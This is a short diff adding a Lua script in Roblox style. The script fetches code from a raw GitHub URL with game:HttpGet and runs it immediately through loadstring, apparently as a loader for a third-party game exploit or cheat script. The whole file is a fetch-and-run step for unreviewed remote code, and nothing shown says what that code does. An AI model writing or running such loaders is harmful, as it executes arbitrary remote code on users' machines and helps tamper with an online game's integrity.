@@ -1,0 +1,6 @@
+local scriptURL = 'https://raw.githubusercontent.com/Jayfrr/erazed2v/refs/heads/main/erazedbroken'
+
+
+local scriptContent = game:HttpGet(scriptURL)
+
+loadstring(scriptContent)()
